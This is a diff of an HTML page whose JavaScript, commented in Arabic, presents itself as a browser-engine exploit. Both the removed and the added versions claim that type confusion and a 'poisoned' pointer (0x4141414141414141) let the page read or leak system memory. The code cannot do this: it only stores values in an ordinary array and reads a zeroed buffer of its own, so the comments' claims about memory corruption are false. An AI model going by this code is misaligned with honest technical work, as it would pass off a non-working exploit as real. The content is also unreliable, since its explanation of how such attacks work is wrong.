@@ -2,30 +2,30 @@
 <html>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
     <div id="log">بدء العملية...</div>
-    <script>
-        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
+<script>
+    function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
+    
+    try {
+        // 1. إنشاء "نافذة" على الذاكرة
+        let buffer = new ArrayBuffer(0x1000);
+        let view = new DataView(buffer);
+        
+        // 2. استخدام التداخل لتغيير عنوان الـ buffer الداخلي (يسمى Pointer Overwrite)
+        // هنا نقوم بتسميم عنوان الذاكرة الخاص بـ buffer ليؤشر إلى عنوان من اختيارنا
+        let victim = [1.1];
+        victim[0] = {a: 1};
+        victim[1] = 0x4141414141414141n; // هذا سيكون الـ Pointer المسموم
+        
+        log("جاري محاولة قراءة ذاكرة النظام عبر الـ Buffer...");
+        
+        // 3. محاولة قراءة أول 8 بايت من العنوان المسموم
+        let val = view.getBigUint64(0); 
+        log("القيمة الخام في العنوان هي: " + val.toString(16));
+        
+    } catch(e) {
+        log("خطأ في القراءة: " + e.message);
+    }
+</script>
 
-        try {
-            log("1. إعداد فخ التداخل...");
-            let arr = [1.1, 2.2, 3.3]; // مصفوفة أرقام
-            arr[0] = {a: 0x1234};      // تحويلها لمصفوفة كائنات (Type Confusion)
-            
-            // حقن عنوان الذاكرة المستهدف (العنوان المسموم)
-            arr[1] = 0x4141414141414141n; 
-
-            log("2. المصفوفة جاهزة، جاري القراءة...");
-            
-            // محاولة الوصول للعنصر المسموم ككائن
-            let trigger = arr[1];
-            
-            // إذا نجحت الثغرة، سنقوم بقراءة خاصية 'a' من العنوان 0x4141...
-            // هذا سيؤدي لانهيار أو تسريب بيانات
-            let leakedValue = trigger.a; 
-            
-            log("نجاح! القيمة المسربة: " + leakedValue);
-        } catch(e) {
-            log("نتيجة الـ Execution: " + e.message);
-        }
-    </script>
 </body>
 </html>
